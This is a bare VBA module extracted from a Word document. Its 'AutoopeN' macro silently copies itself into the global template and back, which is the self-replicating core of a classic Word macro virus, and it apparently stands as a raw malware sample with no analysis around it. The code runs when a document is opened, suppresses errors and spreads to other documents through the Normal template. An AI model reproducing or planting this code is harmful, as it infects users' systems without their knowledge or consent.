   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoopeN"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error Resume Next: a$ = WordBasic.[FileName$]() + ":AutoopeN"
   b$ = "Global:aUTOOPEn": WordBasic.MacroCopy a$, b$
   WordBasic.MacroCopy b$, a$
   End Sub
